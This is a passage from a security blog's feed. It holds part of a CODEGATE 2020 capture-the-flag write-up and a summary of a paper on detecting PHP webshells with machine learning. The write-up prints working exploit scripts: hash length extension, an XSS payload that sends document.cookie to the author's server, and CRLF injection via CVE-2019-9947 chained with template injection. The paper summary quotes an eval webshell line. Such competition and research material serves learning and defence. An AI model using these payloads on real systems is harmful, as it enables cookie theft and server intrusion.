class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">old_sig = <span class="string">"43bb08065a4d2217ca3881e93c65276b"</span></span><br><span class="line">old_data = <span class="string">"MTIz,NDU2,Nzg5"</span> <span class="comment"># 123 456 789</span></span><br><span class="line">url = <span class="string">"http://110.10.147.166/api.php?sig=%s&amp;q=%s"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    result = hashpumpy.hashpump(old_sig, old_data, <span class="string">"|Nzg5,NDU2,MTIz"</span>, i)  <span class="comment"># 789 456 123</span></span><br><span class="line">    new_sig = result[<span class="number">0</span>]</span><br><span class="line">    new_data = base64.b64encode(result[<span class="number">1</span>])</span><br><span class="line">    now_url = url % (new_sig,new_data)</span><br><span class="line">    r = requests.get(now_url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'??'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.content:</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>运行可得，salt长度为12。<br>那么此时可以并行构造header和body，但是如何bypass csp呢？<br>由于不擅XSS，赛后请教了一下Melody师傅,得知可用404进行bypass：<br><img src="/images/2020-02-09-16-28-01.png" alt=""><br>参考link：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.yulegeyu.com/2018/07/15/CSP-unsafe-inline%E6%97%B6-%E5%BC%95%E5%85%A5%E5%A4%96%E9%83%A8js/</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-02-09-16-37-54.png" alt=""><br>得到:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api.php?sig=fa74cda5bdd2f4da4170e064a5462449&amp;q=YUdWaFpHVnksU0ZSVVVDOHhJRFF3TkE9PSxjMnQ1YzJWag==</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-02-09-16-20-27.png" alt=""><br>构造：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_exp</span><span class="params">(a,b,c)</span>:</span></span><br><span class="line"><span class="keyword">return</span> base64.b64encode(a)+<span class="string">','</span>+base64.b64encode(b)+<span class="string">','</span>+base64.b64encode(c)</span><br><span class="line"></span><br><span class="line">old_sig = <span class="string">"fa74cda5bdd2f4da4170e064a5462449"</span></span><br><span class="line">old_data = base64.b64decode(<span class="string">'YUdWaFpHVnksU0ZSVVVDOHhJRFF3TkE9PSxjMnQ1YzJWag=='</span>)  <span class="comment">#header,HTTP/1 404,skysec</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://110.10.147.166/api.php?sig=%s&amp;q=%s"</span></span><br><span class="line"></span><br><span class="line">a = <span class="string">'body'</span></span><br><span class="line">b = <span class="string">'''&lt;img src=x onerror="location.href='//vps:23334/?c='+escape(document.cookie);"</span></span><br><span class="line"><span class="string">&gt;'''</span></span><br><span class="line">c = <span class="string">''</span></span><br><span class="line">exp = <span class="string">'|'</span>+gen_exp(a,b,c)</span><br><span class="line">result = hashpumpy.hashpump(old_sig, old_data, exp, <span class="number">12</span>)</span><br><span class="line">new_sig = result[<span class="number">0</span>]</span><br><span class="line">new_data = base64.b64encode(result[<span class="number">1</span>])</span><br><span class="line">now_url = url % (new_sig,new_data)</span><br><span class="line"><span class="keyword">print</span> now_url</span><br></pre></td></tr></table></figure></p><p>得到exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://110.10.147.166/api.php?sig=812ada09f5d2713a436156061126977d&amp;q=YUdWaFpHVnksU0ZSVVVDOHhJRFF3TkE9PSxjMnQ1YzJWaoAAAAAAAAAAAABwAQAAAAAAAHxZbTlrZVE9PSxQR2x0WnlCemNtTTllQ0J2Ym1WeWNtOXlQU0pzYjJOaGRHbHZiaTVvY21WbVBTY3ZMekV3Tmk0eE5DNHhNVFF1TVRJM09qSXpNek0wTHo5alBTY3JaWE5qWVhCbEtHUnZZM1Z0Wlc1MExtTnZiMnRwWlNrN0lnbyss</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-02-09-16-55-48.png" alt=""><br>得到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CODEGATE2020&#123;CSP_m34n5_Content-Success-Policy_n0t_Security&#125;</span><br></pre></td></tr></table></figure></p><h2 id="renderer"><a href="#renderer" class="headerlink" title="renderer"></a>renderer</h2><h3 id="XFF可控"><a href="#XFF可控" class="headerlink" title="XFF可控"></a>XFF可控</h3><p><img src="/images/2020-02-09-11-31-39.png" alt=""><br>题目给予了一个路由，尝试访问后发现，XFF可控：<br><img src="/images/2020-02-09-11-32-10.png" alt=""><br>但是fuzz后发现，好像并不能直接利用。</p><h3 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h3><p>后续关注到题目给予了dockerfile：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">FROM python:2.7.16</span><br><span class="line"></span><br><span class="line">ENV FLAG CODEGATE2020&#123;**DELETED**&#125;</span><br><span class="line"></span><br><span class="line">RUN apt-get update</span><br><span class="line">RUN apt-get install -y nginx</span><br><span class="line">RUN pip install flask uwsgi</span><br><span class="line"></span><br><span class="line">ADD prob_src/src /home/src</span><br><span class="line">ADD settings/nginx-flask.conf /tmp/nginx-flask.conf</span><br><span class="line"></span><br><span class="line">ADD prob_src/static /home/static</span><br><span class="line">RUN chmod 777 /home/static</span><br><span class="line"></span><br><span class="line">RUN mkdir /home/tickets</span><br><span class="line">RUN chmod 777 /home/tickets</span><br><span class="line"></span><br><span class="line">ADD settings/run.sh /home/run.sh</span><br><span class="line">RUN chmod +x /home/run.sh</span><br><span class="line"></span><br><span class="line">ADD settings/cleaner.sh /home/cleaner.sh</span><br><span class="line">RUN chmod +x /home/cleaner.sh</span><br><span class="line"></span><br><span class="line">CMD [&quot;/bin/bash&quot;, &quot;/home/run.sh&quot;]</span><br></pre></td></tr></table></figure></p><p>同时注意到其用urllib完成了request功能：<br><img src="/images/2020-02-09-11-27-45.png" alt=""><br>那么尝试使用CVE，探测是否存在CRLF注入：CVE-2019-9947，发现其漏洞范围为2.x ~ 2.7.16刚好符合dockerfile中的版本号，于是进行尝试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[vps-ip]:23333?%0d%0apayload%0d%0apadding</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-02-09-11-30-42.png" alt=""><br>发现确实存在CRLF注入攻击。<br>进一步尝试，利用CLRF注入，访问题目的whatismyip功能：<br><img src="/images/2020-02-09-11-52-39.png" alt=""><br>发现确实可以进行127.0.0.1的伪造访问，并且可控XFF，但陷入僵局。</p><h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><p>赛后得知，题目可以进行目录穿越，进行任意文件下载：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://58.229.253.144/static../src/app/routes.py</span><br></pre></td></tr></table></figure></p><p>审计代码发现：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@front.route("/admin", methods=["GET"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_access</span><span class="params">()</span>:</span></span><br><span class="line">    ip = get_ip()</span><br><span class="line">    rip = get_real_ip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">"127.0.0.1"</span>, <span class="string">"127.0.0.2"</span>]: <span class="comment">#super private ip :)</span></span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ip != rip: <span class="comment">#if use proxy</span></span><br><span class="line">        ticket = write_log(rip)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">"admin_remote.html"</span>, ticket = ticket)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> ip == <span class="string">"127.0.0.2"</span> <span class="keyword">and</span> request.args.get(<span class="string">"body"</span>):</span><br><span class="line">            ticket = write_extend_log(rip, request.args.get(<span class="string">"body"</span>))</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">"admin_local.html"</span>, ticket = ticket)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">"admin_local.html"</span>, ticket = <span class="keyword">None</span>)</span><br></pre></td></tr></table></figure></p><p>我们可以利用其中代码对log写入内容:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ip != rip: <span class="comment">#if use proxy</span></span><br><span class="line">    ticket = write_log(rip)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"admin_remote.html"</span>, ticket = ticket)</span><br></pre></td></tr></table></figure></p><p>而跟进rip，其赋值来自于：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip = get_real_ip()</span><br></pre></td></tr></table></figure></p><p>跟进函数实现：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_real_ip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> request.headers.get(<span class="string">"X-Forwarded-For"</span>) <span class="keyword">or</span> get_ip()</span><br></pre></td></tr></table></figure></p><p>发现可用XFF控制写入log内容。<br>跟进write_log：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_log</span><span class="params">(rip)</span>:</span></span><br><span class="line">    tid = hashlib.sha1(str(time.time()) + rip).hexdigest()</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"/home/tickets/%s"</span> % tid, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        log_str = <span class="string">"Admin page accessed from %s"</span> % rip</span><br><span class="line">        f.write(log_str)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> tid</span><br></pre></td></tr></table></figure></p><p>故此，可以尝试在/admin路由，利用XFF写入文件，同时会返回其ticket:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://127.0.0.1/renderer/admin+HTTP/1.1%0aX-Forwarded-For: &#123;&#123;1+1&#125;&#125;%0a</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-02-09-11-53-23.png" alt=""><br>而后，利用/admin/ticket读取文件，触发ssti:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_ticket</span><span class="params">()</span>:</span></span><br><span class="line">    ip = get_ip()</span><br><span class="line">    rip = get_real_ip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ip != rip: <span class="comment">#proxy doesn't allow to show ticket</span></span><br><span class="line">        <span class="keyword">print</span> <span class="number">1</span></span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">"127.0.0.1"</span>, <span class="string">"127.0.0.2"</span>]: <span class="comment">#only local</span></span><br><span class="line">        <span class="keyword">print</span> <span class="number">2</span></span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    <span class="keyword">if</span> request.headers.get(<span class="string">"User-Agent"</span>) != <span class="string">"AdminBrowser/1.337"</span>:</span><br><span class="line">        <span class="keyword">print</span> request.headers.get(<span class="string">"User-Agent"</span>)</span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">"ticket"</span>):</span><br><span class="line">        log = read_log(request.args.get(<span class="string">"ticket"</span>))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> log:</span><br><span class="line">            <span class="keyword">print</span> <span class="number">4</span></span><br><span class="line">            abort(<span class="number">403</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template_string(log)</span><br></pre></td></tr></table></figure></p><p>构造exp如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = http://127.0.0.1/renderer/admin/ticket?ticket=c0105720c3cd521aadd35064b24db9699b2bc646+HTTP/1.1%0aUser-Agent: AdminBrowser/1.337%0aX-Forwarded-For: 127.0.0.1%0aA: B%0a</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-02-09-12-18-40.png" alt=""><br>测试发现，确实可以伪造http header。但是此处存在一个问题，即UA覆盖，最下面的UA，会覆盖我们上面的UA，所以得Connection: close。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = http://127.0.0.1/renderer/admin/ticket?ticket=c0105720c3cd521aadd35064b24db9699b2bc646 HTTP/1.1%0d%0aHost: 127.0.0.1%0d%0aUser-Agent: AdminBrowser/1.337%0d%0aX-Forwarded-For: 127.0.0.1%0d%0aConnection: close%0d%0a%0d%0askycool</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-02-09-12-26-34.png" alt=""><br>即可触发ssti:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> request.args.get(<span class="string">"ticket"</span>):</span><br><span class="line">    log = read_log(request.args.get(<span class="string">"ticket"</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> log:</span><br><span class="line">        <span class="keyword">print</span> <span class="number">4</span></span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(log)</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-02-09-12-51-39.png" alt=""><br>发现flag位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ENV FLAG CODEGATE2020&#123;**DELETED**&#125;</span><br></pre></td></tr></table></figure></p><p>exp如下:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url = <span class="string">'http://58.229.253.144/renderer/'</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'''http://127.0.0.1/renderer/admin HTTP/1.1%%0d%%0aX-Forwarded-For: %s%%0d%%0a'''</span></span><br><span class="line">payload2 = <span class="string">'''http://127.0.0.1/renderer/admin/ticket?ticket=%s HTTP/1.1%%0d%%0aHost: 127.0.0.1%%0d%%0aUser-Agent: AdminBrowser/1.337%%0d%%0aX-Forwarded-For: 127.0.0.1%%0d%%0aConnection: close%%0d%%0a%%0d%%0askycool'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssti_payload = <span class="string">'''&#123;&#123;config&#125;&#125;'''</span></span><br><span class="line"></span><br><span class="line">exp1 = payload1 % ssti_payload</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'url'</span>:urllib.unquote(exp1)</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url,data=data)</span><br><span class="line">ticket = r.content[<span class="number">1652</span>:<span class="number">1692</span>]</span><br><span class="line">exp2 = payload2%ticket</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'url'</span>:urllib.unquote(exp2)</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url,data=data)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><p>运行即可拿到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CODEGATE2020&#123;CrLfMakesLocalGreatAgain&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;CSP&quot;&gt;&lt;a href=&quot;#CSP&quot; class=&quot;headerlink&quot; title=&quot;CSP&quot;&gt;&lt;/a&gt;CSP&lt;/h2&gt;&lt;p&gt;随手尝试：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gut
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
      <category term="writeup" scheme="http://skysec.top/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>Paper Summary &amp; Webshell Detection Based on Random Forest–Gradient Boosting Decision Tree Algorithm</title>
    <link href="http://skysec.top/2020/01/14/Paper-Summary-Webshell-Detection-Based-on-Random-Forest%E2%80%93Gradient-Boosting-Decision-Tree-Algorithm/"/>
    <id>http://skysec.top/2020/01/14/Paper-Summary-Webshell-Detection-Based-on-Random-Forest–Gradient-Boosting-Decision-Tree-Algorithm/</id>
    <published>2020-01-14T02:21:54.000Z</published>
    <updated>2020-06-22T07:27:02.009Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇文章《Webshell Detection Based on Random Forest–Gradient Boosting Decision Tree Algorithm》是和前一篇文章《Detecting Webshell Based on Random Forest with FastText》同一学校所作，研究问题依旧是检测webshell，两篇文章同样是利用了随机森林算法，前一篇结合的是fastText，而本篇文章结合的是梯度提升迭代决策树算法。</p><h2 id="研究方法"><a href="#研究方法" class="headerlink" title="研究方法"></a>研究方法</h2><p>在前一篇文章中，对于features的提取分为两大步：</p><ol><li>分析提取文件的静态特征</li><li>利用PHP-VLD获取文件的Opcode，利用fastText训练文本分类器模型<h3 id="静态特征"><a href="#静态特征" class="headerlink" title="静态特征"></a>静态特征</h3>而本篇文章中所用和其相似，但有所提升，作者在前一篇文章的基础上增加了如下文件的静态特征：<br>1.数据压缩比<br>由于base64方式压缩的webshell通常具有更均衡的特定字符分布，并且往往具有更高的数据压缩比，因此使用数据压缩比检测webshell，有一定的成效。<br>2.eval函数的使用<br>一句话木马的重要特性即eval，一般的一句话木马格式如下：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">eval</span> ($_post[xxxxx])</span><br></pre></td></tr></table></figure></li></ol><p>因此一个文件的eval的数量是模型训练的一个重要feature。<br>如此之外，之前的文章利用PHP-VLD提取文件Opcode，再使用fastText训练文本分类器，而本篇文章与之不同，作者将获得的Opcode，使用Scikit-learn从中提取2种特征：TF-IDF向量和Hash向量。</p><h3 id="TF-IDF-Vector"><a href="#TF-IDF-Vector" class="headerlink" title="TF-IDF Vector"></a>TF-IDF Vector</h3><p>TF即Term frequency，词频计算公式如下：<br><img src="/images/2020-01-14-10-54-31.png" alt=""><br>其用来评估一个词语在文本中出现的频率。<br>IDF即inverse document frequency，逆文本频率指数如下：<br><img src="/images/2020-01-14-10-55-28.png" alt=""><br>其用于评估该词语在所有文本中是否罕见。<br>故此TF-IDF的主要思想是：如果某个词或短语在一篇文章中出现的频率TF高，并且在其他文章中很少出现，则认为此词或者短语具有很好的类别区分能力，适合用来分类。<br>其计算方法如下：<br><img src="/images/2020-01-14-10-58-18.png" alt=""></p><h3 id="Hash-Vector"><a href="#Hash-Vector" class="headerlink" title="Hash Vector"></a>Hash Vector</h3><p>hash散列可以将任意长度的数据转换为固定长度的数据，同时这种这种转换通常是一对一的，我们很难找到同样的hash对应不同的数据。因此可以利用hash作为某个特征向量的索引，因此无需创建大型字典，而这个恰好是TF-IDF所缺乏的。<br>例如：特征 i 会被hash到索引位置j：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h(i) = j</span><br></pre></td></tr></table></figure></p><p>特征 i 的词频表示为φ(i)，那么公式如下：<br><img src="/images/2020-01-14-11-04-48.png" alt=""><br>在提取特征结束后，作者尝试在仅适用6个静态特征和GBDT算法进行检测,成功率已达96.9%。<br>对于GBDT算法，其核心是：每棵树学的是之前所有树结论和的残差，即真实值-预测值。每一轮梯度boosting训练都会减少上一轮训练的残差，即在梯度方向上训练一个新的模型来降低上一轮训练的残差。<br><img src="/images/2020-01-14-13-52-13.png" alt=""><br>其优点在于可以有效减少feature，降低过拟合现象，并且具有更高的鲁棒性，不太可能受到训练集规模的影响。<br>这也是作者将其与随机森林算法结合使用的一个原因。同时为了进一步提高效率,作者加入了PHP Opcode的特征提取，和随机森林算法：<br><img src="/images/2020-01-14-11-16-59.png" alt=""><br>在结合前6个静态特征后，作者使用随机森林获取TF-IDF矩阵和hash矩阵的预测结果，最后结合8个feature对GBDT进行训练。</p><h2 id="数据实验"><a href="#数据实验" class="headerlink" title="数据实验"></a>数据实验</h2><p>作者从Github收集了2232个webshell，2388 CMS样本文件：<img src="/images/2020-01-14-11-07-23.png" alt=""><br>但由于有些文件提取特征不成功，或者并非php文件，作者丢弃了大小超过20000的文件，并未使用。<br>而后作者从如下几个角度评估了RF-GBDT算法的性能：<br><img src="/images/2020-01-14-11-09-56.png" alt=""><br><img src="/images/2020-01-14-11-10-08.png" alt=""><br>同时作者进行了一些对照实验，结果如下：<br><img src="/images/2020-01-14-11-12-34.png" alt=""><br><img src="/images/2020-01-14-14-13-26.png" alt=""><br>可以看到，如果仅用6个静态features的GBDT在各方面的性能都不如使用8个features的RF-GBDT。除此之外，作者还挑选了一些网上主流的webshell检测工具，结果如下：<br><img src="/images/2020-01-14-11-13-43.png" alt=""><br>这同时也证明了RF-GBDT具有非常好的性能。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本篇文章《Webshell Detection Based on Random Forest–Gradient Boosting Decis
      
    
    </summary>
    
      <category term="paper" scheme="http://skysec.top/categories/paper/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
      <category term="paper" scheme="http://skysec.top/tags/paper/"/>
    
      <category term="ml" scheme="http://skysec.top/tags/ml/"/>
    
  </entry>
  
</feed>
